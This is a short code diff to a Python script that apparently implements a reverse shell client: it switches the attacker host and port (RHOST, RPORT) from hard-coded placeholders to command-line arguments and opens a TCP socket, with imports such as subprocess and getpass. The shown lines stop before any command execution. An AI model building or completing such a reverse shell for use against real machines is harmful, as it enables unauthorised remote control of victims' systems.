@@ -3,14 +3,15 @@ import subprocess
 import os
 import platform
 import getpass
+import sys
 import colorama
 from colorama import Fore, Style
 from time import sleep
 
 colorama.init()
 
-RHOST = "ip" # add your ip
-RPORT = port #add your port
+RHOST = sys.argv[1] # add your ip
+RPORT = sys.argv[2] #add your port
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
